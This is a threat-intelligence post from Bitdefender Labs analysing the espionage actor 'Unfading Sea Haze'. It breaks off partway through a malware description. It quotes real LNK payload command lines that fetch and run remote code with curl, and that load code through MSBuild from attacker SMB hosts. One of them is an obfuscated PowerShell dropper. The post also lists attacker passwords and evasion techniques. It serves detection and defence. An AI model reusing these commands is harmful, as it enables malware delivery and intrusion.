{layout:"default",data:[{post:{id:"167932745094",slug:"deep-dive-into-unfading-sea-haze-a-new-threat-actor-in-the-south-china-sea",title:"Deep Dive Into Unfading Sea Haze: A New Threat Actor in the South China Sea",feature_image:t,og_image:t,html:"\u003Cp\u003EIn a recent investigation by Bitdefender Labs, a series of cyberattacks targeting high-level organizations in South China Sea countries revealed a previously unknown threat actor. We've designated this group \"\u003Cstrong\u003EUnfading Sea Haze\u003C\u002Fstrong\u003E\" based on their persistence and focus on the region. The targets and nature of the attacks suggest alignment with Chinese interests.\u003C\u002Fp\u003E\n\u003C!--more--\u003E\u003Cp\u003EThis wasn't just about uncovering the present activities of Unfading Sea Haze. It was a journey through time, a digital archaeology of sorts. Our investigation, spanning at least eight victims – primarily military and government targets – stretched back to 2018. We documented Unfading Sea Haze’s current tactics, techniques, and procedures (TTPs), but also the tools they developed in the past.\u003C\u002Fp\u003E\n\u003Cp\u003EAnalyzing multiple generations of their tools was like exploring a museum exposition of cyberespionage relics. We found multiple iterations based on the well-known \u003Ca href=\"https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0032\u002F\" rel=\"nofollow noopener\" target=\"_blank\"\u003EGh0st RAT\u003C\u002Fa\u003E framework, alongside various .NET payloads.\u003C\u002Fp\u003E\n\u003Cp\u003EBut the investigation revealed a troubling trend beyond the historical context. Notably, the attackers repeatedly regained access to compromised systems. This exploitation highlights a critical vulnerability: poor credential hygiene and inadequate patching practices on exposed devices and web services.\u003C\u002Fp\u003E\n\u003Cp\u003EThe extended period of Unfading Sea Haze’s invisibility, exceeding five years for a likely nation-state actor, is particularly concerning. Despite extensive cross-referencing of artifacts and scouring public reports, we haven't found any traces of their previous activities. This research aims to raise awareness of the ongoing threat posed by Unfading Sea Haze and the importance of robust cybersecurity practices. By sharing our findings, we want to help the security community with the knowledge to detect and disrupt their espionage efforts.\u003C\u002Fp\u003E\n\u003Cp\u003EThis summary provides a high-level overview of the Unfading Sea Haze threat actor's tactics and the evolving nature of their malware arsenal. For a deeper dive, including a detailed analysis of the Gh0st RAT family and other malware samples, please refer to \u003Ca href=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Ffiles\u002F2024\u002F05\u002FBitdefender-Report-DeepDive-creat7721-en_EN.pdf\" rel=\"noopener\" target=\"_blank\"\u003Ethe full research paper\u003C\u002Fa\u003E by Bitdefender Labs.\u003C\u002Fp\u003E\n\u003Ch1\u003EAttribution\u003C\u002Fh1\u003E\n\u003Cp\u003EPinpointing the exact culprit behind a cyberattack can be a complex task, and attributing the attacks we investigated to Unfading Sea Haze was no exception. Here's TL; DR version of our research:\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cstrong\u003ENo Match with a Previous Activity\u003C\u002Fstrong\u003E: Our investigation yielded no clear connection to any previously identified threat actor. This lack of a known signature led us to designate this group as \"Unfading Sea Haze\".\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cstrong\u003EGeopolitical Targeting\u003C\u002Fstrong\u003E: The focus of Unfading Sea Haze's attacks – government and military organizations in South China Sea countries – suggests alignment with Chinese interests.\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cstrong\u003ETool Sharing Among Neighbors\u003C\u002Fstrong\u003E: The use of various Gh0st RAT variants, a tool popular with Chinese actors, hints at a potential network for sharing these tools within the Chinese cyber ecosystem.\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cstrong\u003ETechnique Similarity\u003C\u002Fstrong\u003E: One specific technique employed by Unfading Sea Haze – running JScript code through a tool called SharpJSHandler – resembled a feature found in the \"funnyswitch\" backdoor, which \u003Ca href=\"https:\u002F\u002Fwww.ptsecurity.com\u002Fww-en\u002Fanalytics\u002Fpt-esc-threat-intelligence\u002Fhigaisa-or-winnti-apt-41-backdoors-old-and-new\u002F\" rel=\"nofollow noopener\" target=\"_blank\"\u003Ehas been linked to APT41\u003C\u002Fa\u003E. Both involve loading .NET assemblies and executing JScript code. However, this was an isolated similarity. No other overlaps with APT41's known tools were identified. This single similarity could be another indication of shared coding practices within the Chinese cyber threat scene.\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EThe lack of a definitive match and the presence of these suggestive clues paint a picture of a sophisticated threat actor with connections to the Chinese cyber ecosystem. However, more investigation and collaboration are needed to solidify this attribution.\u003C\u002Fp\u003E\n\u003Ch1\u003EAnatomy of an Attack\u003C\u002Fh1\u003E\n\u003Cp\u003EUnderstanding how these attacks unfolded wasn't straightforward. We didn’t want to focus just on the latest incident. Instead, we wanted to examine the Unfading Sea Haze threat actor's past activities and any traces they may have left behind. This broader investigation, while necessary, made things more complex.\u003C\u002Fp\u003E\n\u003Ch2\u003EInitial Compromise\u003C\u002Fh2\u003E\n\u003Cp\u003EUnfortunately, the initial method Unfading Sea Haze used to infiltrate victim systems remains unknown. This initial breach happened over six years ago, making forensic evidence scarce and difficult to recover.\u003C\u002Fp\u003E\n\u003Cp\u003EHowever, we were able to identify at least one method of regaining access: spear-phishing emails with malicious archives. These archives contained LNK files disguised as regular documents. When clicked, these LNK files would execute malicious commands. We observed multiple spear-phishing attempts occurring in the three months of 2023 (March through May).\u003C\u002Fp\u003E\n\u003Cp\u003EHere are some of the email attachment names used:\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003ESUMMARIZE SPECIAL ORDERS FOR PROMOTIONS CY2023\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003EData\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003EDoc\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003EStartechup_fINAL\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EIn each case, the LNK file was hidden inside a ZIP archive that shared the same name, for example \u003Cspan style=\"background-color: lightgrey;\"\u003EData.zip\\Data.lnk\u003C\u002Fspan\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EA common tactic used by Unfading Sea Haze was to embed lengthy comments within the LNK file's command line. These comments were likely intended to evade detection. We've included a full list of command lines in \u003Ca href=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Ffiles\u002F2024\u002F05\u002FBitdefender-Report-DeepDive-creat7721-en_EN.pdf\" rel=\"nofollow noopener\" target=\"_blank\"\u003Ethe full research white paper\u003C\u002Fa\u003E, but here is an example of this technique:\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E\"C:\\\\Windows\\\\System32\\\\cmd.exe\" ;Learn English online and improve your skills through our high-quality courses and resources all designed for adult language learners. Everything you find here has been specially created by the British Council;\u002Fc tasklist|findstr \u002Fi \"ekrn.exe\"||curl -s -k 159.223.78[.]147\u002FRecorded.log -o C:\\\\Users\\\\Public\\\\Libraries\\\\Recorded.log&amp;TIMEOUT \u002FT 10 \u002FNOBREAK&amp;C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\MSBuild C:\\\\Users\\\\Public\\\\Libraries\\\\Recorded.log&gt;nul&amp;&amp;echo Trump graduate\u003C\u002Fspan\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EWhile comment section and filenames could differentiate, the logic was always the same. Let's break it down step by step:\u003C\u002Fp\u003E\n\u003Cp style=\"font-size: 16px; text-align: center;\"\u003E\u003Cimg src=\"https:\u002F\u002Fbusinessresources.bitdefender.com\u002Fhubfs\u002Fimage-png-May-20-2024-04-42-49-1999-PM.png\" loading=\"lazy\" width=\"936\" height=\"316\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EThere is an interesting part where the code checks if a process named \u003Cspan style=\"background-color: lightgrey;\"\u003Eekrn.exe\u003C\u002Fspan\u003E is running (step 3), a process commonly associated with ESET Kernel Service. But this check is followed by a logical OR operator (\u003Cspan style=\"background-color: lightgrey;\"\u003E||\u003C\u002Fspan\u003E) and the execution continues only if this process is NOT detected. This suggests that this is either a defense evasion technique, or threat actors named their own process \u003Cspan style=\"background-color: lightgrey;\"\u003Eekrn.exe\u003C\u002Fspan\u003E, and skip deploying their malware if they find a machine was already compromised.\u003C\u002Fp\u003E\n\u003Cp\u003EWe were able to download the malicious payload (MD5: \u003Cspan style=\"background-color: lightgrey;\"\u003E79da81e35600e3d9ec793537d04920c8\u003C\u002Fspan\u003E) from one of the identified URLs. Further analysis of the assembly confirmed it's a backdoor program we named \u003Cstrong\u003ESerialPktdoor\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EIn March 2024, new archive files for initial access were observed. These archives were mimicking the installation process of Microsoft Defender or exploiting current US political issues. List of archive names follows:\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003Einstall microsoft defender web protection\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003Estart windowsdefender\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003EWlndovvs Deffender User Guide Document\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003Ebarack obama's tenure as the 44th president of the united states\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003EPresidency of Barack Obama\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003EAssange_Labeled_an_'Enemy'_of_the_US_in_Secret_Pentagon_Documents102\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EThese LNK files execute a PowerShell command line similar to the one bellow (or the base64 encoded version of it):\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003EC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w Hidden -c \\\"net use http:\u002F\u002Floadviber.webredirect[.]org;Start-Process -WindowStyle Hidden -WorkingDirectory \\\\154.90.34[.]83\\exchange\\info C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe\u003C\u002Fspan\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EThis is a clever example of a fileless attack that exploits a legitimate tool: MSBuild.exe. MSBuild, short for Microsoft Build Engine, is a powerful tool for automating the software build process on Windows. MSBuild reads a project file, which specifies the location of all source code components, the order of assembly, and any necessary build tools. MSBuild supports various programming languages like C#, C++, and even web development projects. It's a core component behind popular development environments like Visual Studio.\u003C\u002Fp\u003E\n\u003Cp\u003EWhen launching MSBuild, you typically specify a project file as a command-line argument. This project file provides instructions on how to build the software. If the project file isn't specified on the command line, MSBuild tries to search for a project file within the current working directory by default. If a project file is located, MSBuild will attempt to execute the instructions within that file. Here's the key point: this execution happens entirely in memory without ever writing the contents of the project file to disk.\u003C\u002Fp\u003E\n\u003Cp style=\"font-size: 16px; text-align: left;\"\u003EIn this attack, the criminals start a new MSBuild process with a twist: they specify a working directory located on a remote SMB server (like \u003Cspan style=\"background-color: lightgrey;\"\u003E\\154.90.34.83\\exchange\\info\u003C\u002Fspan\u003E in the above example). By setting the working directory to a remote location, MSBuild will search for a project file on that remote server. If a project file is found, MSBuild will execute the code it contains entirely in memory, leaving no traces on the victim's machine.\u003C\u002Fp\u003E\n\u003Cp style=\"font-size: 16px; text-align: center;\"\u003E\u003Cimg src=\"https:\u002F\u002Fbusinessresources.bitdefender.com\u002Fhubfs\u002Fimage-png-May-20-2024-04-43-30-4481-PM.png\" loading=\"lazy\" width=\"936\" height=\"314\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EAnother example showcases a more intricate and obfuscated version of the same technique.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ;\\\"Joseph Robinette Biden Jr. (\u002F'ba?d?n\u002F (listen) BY-d?n; born 20 November 1942) is an American politician who is the 46th and current president of the United States. A member of the Democratic Party, he previously served as the 47th vice president from 2009 to 2017 under President Barack Obama, and represented Delaware in the United States Senate from 1973 to 2009.\\\";$O=$env:tmp;$X=\\\"(U)_Summary_Complaint_Report.lnk\\\";$Q=\"gci $O -r -ea 0|?{$_.Name -like $X -and $_.Length -eq 205518}|sort LastWriteTime -desc\";if($Q.Count -gt 0){$X=$Q[0].FullName;};$Y=[System.IO.File];$K=$Y::ReadALlBytes($X);$Z=$O+\\\"\\(U)_Summary_Complaint_Report.jpg\\\";$Y::WriteAllBytes($Z,$K[3616..202733]);if(test-path $Z){&amp;$Z;};$Z=$O+\\\"\\New_Text_Document_jpg_012.log\\\";$Y::WriteAllBytes($Z,$K[202734..205517]);c:\\w*\\*t\\*4\\v4*\\*d.*e \"$Z\";\u003C\u002Fspan\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EHere's a breakdown of this script block:\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003EThe script starts with a seemingly irrelevant comment about Joseph R. Biden Jr. This is likely an attempt to distract from the actual malicious code.\u003C\u002Fli\u003E\n\u003Cli\u003EThe PowerShell code extracts a hidden file from another seemingly harmless file. It accomplishes this by searching for a specific file named \u003Cspan style=\"background-color: lightgrey;\"\u003E(U)_Summary_Complaint_Report.lnk\u003C\u002Fspan\u003E, extracting a portion of the bytes from that file and saving it as a new file named \u003Cspan style=\"background-color: lightgrey;\"\u003Elog\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003Cli\u003EThe last line uses complex patterns with wildcards (\u003Cspan style=\"background-color: lightgrey;\"\u003Ec:\\w*\\*t\\*4\\v4*\\*d.*e\u003C\u002Fspan\u003E) to represent the path to \u003Cspan style=\"background-color: lightgrey;\"\u003Eexe\u003C\u002Fspan\u003E. It then passes the newly created file (\u003Cspan style=\"background-color: lightgrey;\"\u003ENew_Text_Document_jpg_012.log\u003C\u002Fspan\u003E) as a parameter (\u003Cspan style=\"background-color: lightgrey;\"\u003E$Z\u003C\u002Fspan\u003E) to MSBuild.\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EOn one of the compromised machines, we also found evidence that malicious tools were using Apache \u003Cspan style=\"background-color: lightgrey;\"\u003Ehttpd.exe\u003C\u002Fspan\u003E, suggesting that the attackers might have exploited vulnerabilities in web server software to gain access to systems.\u003C\u002Fp\u003E\n\u003Ch2\u003EPersistence\u003C\u002Fh2\u003E\n\u003Cp\u003EThe attackers seem to favor scheduled tasks as a way to establish persistence. Here's what's interesting: scheduled task names mimic legitimate Windows files but are combined with DLL sideloading to execute a malicious payload. For example, a task named \u003Cspan style=\"background-color: lightgrey;\"\u003E\\microsoft\\windows\\clipsetup\\clipsvc\u003C\u002Fspan\u003E runs the harmless \u003Cspan style=\"background-color: lightgrey;\"\u003Eclipsvc.exe\u003C\u002Fspan\u003E program (renamed \u003Cspan style=\"background-color: lightgrey;\"\u003Emspaint.exe\u003C\u002Fspan\u003E), which in turns loads a malicious library (DLL file).\u003C\u002Fp\u003E\n\u003Cp\u003EThis tactic demonstrates how attackers exploited legitimate software. They identified common programs on victim machines, like the genuine \u003Cspan style=\"background-color: lightgrey;\"\u003Emspaint.exe\u003C\u002Fspan\u003E located in \u003Cspan style=\"background-color: lightgrey;\"\u003Ec:\\\\Windows\\\\WinSxS\\\\amd64_microsoft-windows-mspaint_31bf3856ad364e35_10.0.17763.1697_none_db927d8fc072840a\u003C\u002Fspan\u003E. They then copied this executable and renamed it to \u003Cspan style=\"background-color: lightgrey;\"\u003EServerManager.exe\u003C\u002Fspan\u003E. The key here is the new location. Attackers placed this renamed copy in a directory \u003Cspan style=\"background-color: lightgrey;\"\u003Ec:\\\\ProgramData\\\\Microsoft\\\\ServerManager\\\\Events\\\\\u003C\u002Fspan\u003E. Alongside this executable, they placed a malicious DLL file (\u003Cspan style=\"background-color: lightgrey;\"\u003Emsftedit.dll\u003C\u002Fspan\u003E) in the same directory.\u003C\u002Fp\u003E\n\u003Cp style=\"font-size: 16px; text-align: left;\"\u003EWhen the program runs from its unfamiliar location, it searches for DLLs in its current directory. By placing the malicious DLL next to the program, the legitimate software gets tricked into loading the attacker's malicious code instead of the intended Microsoft DLL.\u003C\u002Fp\u003E\n\u003Cp style=\"font-size: 16px; text-align: center;\"\u003E\u003Cimg src=\"https:\u002F\u002Fbusinessresources.bitdefender.com\u002Fhubfs\u002Fimage-png-May-20-2024-04-44-02-1133-PM.png\" loading=\"lazy\" width=\"936\" height=\"258\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EIn another example of creative application of DLL sideloading, attackers targeted the service with the display name \"Windows Perception Simulation Service\" (service name \u003Cspan style=\"background-color: lightgrey;\"\u003Eperceptionsimulation\u003C\u002Fspan\u003E). This service typically launches a legitimate library named \u003Cspan style=\"background-color: lightgrey;\"\u003E%SYSTEM%\\hid.dll\u003C\u002Fspan\u003E located in the system directory. However, the attackers exploited this process by adding their own malicious library \u003Cspan style=\"background-color: lightgrey;\"\u003Ehid.dll\u003C\u002Fspan\u003E to folder \u003Cspan style=\"background-color: lightgrey;\"\u003E%SYSTEM%\\perceptionsimulation\u003C\u002Fspan\u003E. This malicious DLL would be loaded by the genuine service executable before the legitimate DLL library.\u003C\u002Fp\u003E\n\u003Cp\u003EWe discovered a tool named \u003Cspan style=\"background-color: lightgrey;\"\u003Eservicemove64.exe\u003C\u002Fspan\u003E that appears to enable the remote deployment of the attack. This tool takes a hostname as a parameter, writes the malicious \u003Cspan style=\"background-color: lightgrey;\"\u003Ehid.dll\u003C\u002Fspan\u003E file on the targeted remote system, and remotely start the \"perceptionsimulation\" service, triggering the sideloading of the attacker's DLL.\u003C\u002Fp\u003E\n\u003Cp\u003EIt's important to note that the default startup type for this service is \"Manual,\" meaning it wouldn't launch automatically on system startup. However, the existence of the \u003Cspan style=\"background-color: lightgrey;\"\u003Eservicemove64.exe\u003C\u002Fspan\u003E tool suggests the attackers might have a method to initiate the service after gaining initial access.\u003C\u002Fp\u003E\n\u003Cp\u003EWe've written a \u003Ca href=\"https:\u002F\u002Ftechzone.bitdefender.com\u002Fen\u002Ftech-explainers\u002Fwhat-is-dll-sideloading.html\"\u003Etech explainer to explain DLL sideloading\u003C\u002Fa\u003E in more detail, in case you'd like to learn more about how it works.\u003C\u002Fp\u003E\n\u003Cp\u003EHere is a list of other scheduled task names that we’ve collected:\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003Eupdate\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003Ebrotherprtdrv\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003Emicrosoftupdate\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003Esynchronizetime222\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003Emicrosoft\\\\windows\\\\wmiprvse\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003Emicrosoft\\windows\\devicesflow\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003Emicrosoft\\\\windows\\\\prod\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003Emicrosoft\\\\windows\\\\coint\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003Emicrosoft\\\\adobeupdate\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E\\\\microsoft\\\\windows\\\\setwlansvc\\\\mscorsvw\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E\\\\microsoft\\\\windows\\\\appxdeploymentclient\\\\proactivescan\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E\\\\microsoft\\\\windows\\\\textservicesframework\\\\synchronizetime222\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E\\\\microsoft\\\\windows\\\\clipsetup\\\\clipsvc\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E\\\\microsoft\\\\windows\\\\connection\\\\netsync\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E \u003C\u002Fspan\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003E\\\\microsoft\\\\windows\\\\services\\\\servermanager\u003C\u002Fspan\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003E&nbsp;\u003C\u002Fp\u003E\n\u003Cp\u003EBeyond using scheduled tasks, the attacker employed another persistence technique: manipulating local Administrator accounts. This involved attempts to enable the disabled local Administrator account, followed by resetting its password.\u003C\u002Fp\u003E\n\u003Cp\u003EIn most cases, the attacker hides the newly enabled Administrator account from the login screen by setting a specific registry key (\u003Cspan style=\"background-color: lightgrey;\"\u003EHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\u003C\u002Fspan\u003E). Interestingly, only two unique passwords were observed for the compromised Administrator accounts: \"\u003Cspan style=\"background-color: lightgrey;\"\u003ED0ueqw0A_63dJJ\u003C\u002Fspan\u003E\" and \"\u003Cspan style=\"background-color: lightgrey;\"\u003EUxxUtZBcM_x8gSb6IHWvp\u003C\u002Fspan\u003E\".\u003C\u002Fp\u003E\n\u003Cp\u003EIn a surprising move for a nation-state threat actor, Unfading Sea Haze has been incorporating Remote Monitoring and Management (RMM) tools into their arsenal. Since at least September 2022, they've been utilizing ITarian RMM to gain a foothold on victim networks. This use of a commercially available RMM tool marks a significant deviation from the typical tactics employed by nation-state actors.\u003C\u002Fp\u003E\n\u003Cp\u003EWe also found evidence suggesting the attacker may have established persistence on web servers, including both Windows IIS and Apache httpd. Potential methods include web shells or malicious modules designed for these web server platforms (IIS modules and httpd modules). However, despite collecting various forensic artifacts, we couldn't definitively determine the exact persistence mechanism due to a lack of crucial information.\u003C\u002Fp\u003E\n\u003Ch2\u003EExecution\u003C\u002Fh2\u003E\n\u003Cp\u003EThe Unfading Sea Haze threat actor has created a sophisticated arsenal of custom malware and tools. This section provides a high-level overview of the most frequently used components observed during the investigation. For a deeper dive into the technical specifics of this malware, we recommend referring to \u003Ca href=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Ffiles\u002F2024\u002F05\u002FBitdefender-Report-DeepDive-creat7721-en_EN.pdf\"\u003Ethe full research whitepaper\u003C\u002Fa\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EFor several years, dating back to at least 2018, the attackers primarily relied on three types of malicious agents: \u003Cstrong\u003ESilentGh0st, TranslucentGh0st\u003C\u002Fstrong\u003E,\u003Cstrong\u003E \u003C\u002Fstrong\u003Eand\u003Cstrong\u003E \u003C\u002Fstrong\u003Ethree variants of the .NET agent \u003Cstrong\u003ESharpJSHandler \u003C\u002Fstrong\u003Esupported by\u003Cstrong\u003E Ps2dllLoader\u003C\u002Fstrong\u003E.\u003Cstrong\u003E \u003C\u002Fstrong\u003EStarting in 2023, in an effort to evade detection, the attackers began deploying new malicious components. Ps2dllLoader has been replaced with a new mechanism that utilizes msbuild.exe and C# payloads stored on a remote SMB share. Fully featured Gh0stRat variations have been replaced with more modular (plugin-based) variants called \u003Cstrong\u003EFluffyGh0st\u003C\u002Fstrong\u003E,\u003Cstrong\u003E InsidiousGh0st\u003C\u002Fstrong\u003E (C++, C#, and Go versions) and \u003Cstrong\u003EEtherealGh0st\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Ch3\u003EPs2dllLoader\u003C\u002Fh3\u003E\n\u003Cp\u003EThis\u003Cstrong\u003E \u003C\u002Fstrong\u003Ecollection of malwares was combined with loader we named \u003Cstrong\u003EPs2dllLoader\u003C\u002Fstrong\u003E, which\u003Cstrong\u003E \u003C\u002Fstrong\u003Ewas responsible for loading the .NET or PowerShell malicious code directly in memory (fileless attack). This functionality allows attackers to bypass traditional security measures that might scan files for suspicious code. In 2024, we have discovered an updated version that includes AMSI and ETW patching to avoid detection.\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cstrong\u003EAntimalware Scanning Interface (AMSI)\u003C\u002Fstrong\u003E is a Windows feature that allows security software to scan code for malware before it is executed, which is especially useful for catching malicious PowerShell code. GravityZone supports \u003Ca href=\"https:\u002F\u002Ftechzone.bitdefender.com\u002Fen\u002Fsecurity-layers\u002Fprotection\u002Ffileless-protection.html#antimalware-scan-interface--amsi--security-provider\"\u003EAMSI's capabilities\u003C\u002Fa\u003E, but we also use \u003Ca href=\"https:\u002F\u002Ftechzone.bitdefender.com\u002Fen\u002Fsecurity-layers\u002Fprotection\u002Ffileless-protection.html#command-line-scanner\"\u003Eproprietary command-line parser\u003C\u002Fa\u003E to enhance our detection coverage.\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cstrong\u003EEvent Tracing for Windows (ETW)\u003C\u002Fstrong\u003E is another essential Windows feature. It functions like a system diary, allowing the operating system and other programs to log important events that occur. This information is valuable for security solutions like EDR and XDR. Attackers sometimes attempt to disable ETW as part of their strategy to bypass detection. To counter this tactic, GravityZone relies on a combination of user-mode and kernel-mode technologies to detect such tampering attempts.\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EIt's worth noting a possible evolution in the attacker's methods. Ps2dllLoader appears to be taking a backseat to a different fileless attack technique. As detailed in the \"Initial Compromise\" section, they are increasingly turning to in-memory execution of .NET payloads leveraging \u003Cspan style=\"background-color: lightgrey;\"\u003EMSBuild.exe\u003C\u002Fspan\u003E and remote SMB shares.\u003C\u002Fp\u003E\n\u003Ch3\u003ESharpJSHandler\u003C\u002Fh3\u003E\n\u003Cp\u003EOne of the payloads delivered by Ps2dllLoader is \u003Cstrong\u003ESharpJSHandler\u003C\u002Fstrong\u003E. It functions like a web shell alternative. This is even hinted at by the final payload's internal name - \u003Cspan style=\"background-color: lightgrey;\"\u003Enoiis.dll\u003C\u002Fspan\u003E. Here, \"No IIS\" suggests the agent acts as an alternative to traditional ASP.NET web shells, but without requiring IIS server to be operational.\u003C\u002Fp\u003E\n\u003Cp\u003ESharpJSHandler operates by listening for HTTP requests. Upon receiving a request, it executes the encoded JavaScript code using the Microsoft.JScript library.\u003C\u002Fp\u003E\n\u003Cp\u003EOur investigation also uncovered two additional variations that utilize cloud storage services for communication instead of direct HTTP requests. We have found variations for DropBox and for OneDrive. In this case, SharpJSHandler retrieves the payload periodically from a DropBox\u002FOneDrive account, executes it, and uploads the resulting output 